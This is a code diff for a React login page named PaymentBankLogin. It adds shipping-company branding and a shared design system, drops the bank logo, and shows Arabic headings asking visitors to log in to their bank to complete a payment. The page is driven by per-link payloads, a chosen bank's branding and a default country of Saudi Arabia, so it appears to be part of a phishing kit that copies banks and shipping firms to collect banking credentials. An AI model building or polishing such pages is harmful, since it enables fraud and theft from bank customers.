@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { bankBranding } from "@/lib/brandingSystem";
+import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ShieldCheck, CheckCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -18,6 +18,7 @@ import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
 import BrandedTopBar from "@/components/BrandedTopBar";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { designSystem } from "@/lib/designSystem";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -49,6 +50,7 @@ const PaymentBankLogin = () => {
   const branding = getServiceBranding(serviceKey);
   
   const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
 
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
 
@@ -258,45 +260,22 @@ const PaymentBankLogin = () => {
               }}
             />
             <div className="text-center mb-8">
-              <div className="flex justify-center mb-6">
-                {selectedBank ? (
-                  <div className="w-32 h-32 flex items-center justify-center p-4">
-                    <BankLogo 
-                      bankId={selectedBank.id}
-                      bankName={selectedBank.name}
-                      bankNameAr={selectedBank.nameAr}
-                      color={selectedBank.color}
-                      size="xl"
-                      className="w-full h-full"
-                    />
-                  </div>
-                ) : (
-                  <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary to-primary/80 flex items-center justify-center">
-                    <Building2 className="w-12 h-12 text-white" />
-                  </div>
-                )}
-              </div>
               
               <h1 
-                className="text-2xl sm:text-3xl font-bold mb-1"
+                className="text-3xl sm:text-4xl font-bold mb-3"
                 style={{ 
-                  color: selectedBankBranding?.colors.text || '#1A1A1A',
-                  fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                  color: designSystem.colors.neutral[900],
+                  fontFamily: designSystem.typography.fontFamilies.arabic,
+                  fontWeight: designSystem.typography.fontWeights.extrabold
                 }}
               >
-                {selectedBank?.nameAr || 'الخدمات المصرفية الإلكترونية'}
+                تسجيل الدخول البنكي
               </h1>
               <p 
-                className="text-sm text-muted-foreground mb-2"
-                style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}
+                className="text-base text-muted-foreground mb-2"
+                style={{ fontFamily: designSystem.typography.fontFamilies.arabic }}
               >
-                {selectedBank?.name || 'Online Banking'}
-              </p>
-              <p 
-                className="text-xs" 
-                style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }}
-              >
-                تسجيل الدخول الآمن
+                سجّل دخول لإكمال عملية الدفع بشكل آمن
               </p>
             </div>
 
